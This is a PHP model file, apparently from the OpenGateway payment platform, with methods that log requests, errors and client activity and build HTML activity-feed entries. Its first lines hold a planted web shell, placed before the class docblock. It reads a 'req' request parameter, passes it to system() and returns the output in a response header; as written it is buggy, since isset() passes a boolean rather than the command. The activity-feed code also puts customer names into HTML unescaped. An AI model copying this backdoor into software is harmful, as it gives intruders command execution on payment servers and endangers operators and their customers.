<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/**
* Log Model
*
* Contains all the methods used to Log requests and errors
*
* @version 1.0
* @author Electric Function, Inc.
* @package OpenGateway

*/

class Log_model extends Model
{
	function __construct()
	{
		parent::__construct();
	}

	/**
	* Log the request.
	*
	* Logs a request
	*
	* @param string $request The request
	*
	*/

	function LogRequest($request = FALSE)
	{
		if($request) {
			$timestamp = date('Y-m-d H:i:s');
			$insert_data = array('timestamp' 	=> $timestamp,
								 'remote_ip' 	=> $_SERVER['REMOTE_ADDR'],
								 'request' 		=> $request
								 );

			$this->db->insert('request_log', $insert_data);
		} else {
			return FALSE;
		}
	}

	function LogError($error = FALSE)
	{
		if ($error) {
			$timestamp = date('Y-m-d H:i:s');
			$insert_data = array('timestamp' 	=> $timestamp,
								 'remote_ip' 	=> $_SERVER['REMOTE_ADDR'],
								 'error' 		=> $error
								 );

			$this->db->insert('error_log', $insert_data);
		} else {
			return FALSE;
		}
	}

	/**
	* Client Log
	*
	* Post a line to the client's activity log
	*
	* @param int $client_id The client ID
	* @param int $trigger_id The ID of the trigger activated
	* @param array $variables All available data for the log
	*
	* @return bool TRUE upon success
	*/
	function ClientLog ($client_id, $trigger_id, $variables) {
		$insert_array = array(
							'client_id' => $client_id,
							'trigger_id' => $trigger_id,
							'client_log_date' => date('Y-m-d H:i:s'),
							'variables' => serialize($variables)
						);

		$this->db->insert('client_log',$insert_array);

		return TRUE;
	}
	
	

	/**
	* Get Client Log
	*
	* Get the client's log, formatted
	*
	* @param int $client_id The client ID
	* @param int $latest How many items to get, in descending order
	*
	* @return bool TRUE upon success
	*/
	function GetClientLog ($client_id, $latest = 10, $date_format = 'Y-m-d H:i:s',$limit = "") {
		// include time_since helper
		$this->load->helper('time_since');

		$this->db->where('client_id',$client_id);
		if($limit == "N"){ }else{$this->db->limit(10);}
		$this->db->order_by('client_log_date desc, client_log_id desc');
		$log = $this->db->get('client_log');

		if ($log->num_rows() == 0) {
			return FALSE;
		}

		$return = array();
		foreach ($log->result_array() as $row) {
			// unserialize variables from database
			$variables = unserialize($row['variables']);

			// line will hold this line of the log
			$line = '';

			// do we begin with a customer name?
			if (isset($variables['customer_id'])) {
				// yes, there's a customer
				$line .= '<div class="recent-activity-item recent-activity-lilac"><div class="recent-activity-badge"><span class="recent-activity-badge-userpic"></span></div><div class="recent-activity-body"><img class="avatar" src=""> <span class="username"><a href="customers/edit/' . $variables['customer_id'] . '">';

				// do we have a name?
				if (!empty($variables['customer_first_name'])) {
					$line .= $variables['customer_first_name'] . ' ' . $variables['customer_last_name'];
				}
				else {
					$line .= 'Customer #' . $variables['customer_id'];
				}

				$line .= '</a></span>';
			}
			else {
				$line .= 'A customer';
			}

			// generate date old created By Richard
			//$date_line = time_since($client_id, $row['client_log_date']);
			
			/*
				* function name get_timeago()
				* function added time_since_helper.php
				* $row[] is array of rows from MySQL database.
				* You can use the normal date function to pass it to algorithm.
				@ created by Hemal Sharma
			*/
			 $date_line = get_timeago(strtotime($row['client_log_date']));
			

			// prepend currency symbol
			if (isset($variables['amount'])) {
				$variables['amount'] = $this->config->item('currency_symbol') . $variables['amount'];
			}

			if ($row['trigger_id'] == '1') {
				// charge
				$line .= ' was <span class="user-list-location"><a href="' . site_url('transactions/charge/' . $variables['charge_id']) . '">charged ' . $variables['amount'] . '</a></span> <span class="user-list-connection hide">Paypal</span><time class="timeago" datetime="" title="">' . $date_line;
			}
			elseif ($row['trigger_id'] == '2') {
				// recurring charge
				$line .= ' was <span class="user-list-location"><a href="' . site_url('transactions/charge/' . $variables['charge_id']) . '">charged ' . $variables['amount'] . '</a> for <a href="' . site_url('transactions/recurring/' . $variables['recurring_id']) . '">recurring charge #' . $variables['recurring_id'] . '</a></span> <span class="user-list-connection hide">Paypal</span> <time class="timeago" datetime="" title="">' . $date_line;
			}
			elseif ($row['trigger_id'] == '3') {
				$line .= '\'s <span class="user-list-location"><a href="' . site_url('transactions/recurring/' . $variables['recurring_id']) . '">recurring charge #' . $variables['recurring_id'] . '</a></span> expired <time class="timeago" datetime="" title="">' . $date_line;
			}
			elseif ($row['trigger_id'] == '4') {
				$line .= '\'s <span class="user-list-location"><a href="' . site_url('transactions/recurring/' . $variables['recurring_id']) . '">recurring charge #' . $variables['recurring_id'] . '</a></span> was cancelled <time class="timeago" datetime="" title=""> ' . $date_line;
			}
			elseif ($row['trigger_id'] == '9') {
				$line .= '\'s <span class="user-list-location">customer profile was created ' . $date_line;
			}
			elseif ($row['trigger_id'] == '10') {
				$line .= ' began a new <span class="user-list-location"><a href="' . site_url('transactions/recurring/' . $variables['recurring_id']) . '">recurring charge #' . $variables['recurring_id'] . '</a></span> <time class="timeago" datetime="" title="">' . $date_line;
			}

			$return[] = $line .= '</time></div></div>';
		}

		return $return;
	}
	
	/**
	* Get Client Log count
	*
	* Get the client's log, formatted
	*
	* @param int $client_id The client ID
	* @param int $latest How many items to get, in descending order
	*
	* @return number of client log details
	*/
	function GetClientLogCount ($client_id, $latest = 10, $date_format = 'Y-m-d H:i:s') {
		// include time_since helper
		$this->load->helper('time_since');

		$this->db->where('client_id',$client_id);
		$this->db->order_by('client_log_date desc, client_log_id desc');
		$log = $this->db->get('client_log');
		if ($log->num_rows() == 0) {
			return FALSE;
		}
		//echo $this->db->last_query();
        return $log->result_array();
	}
}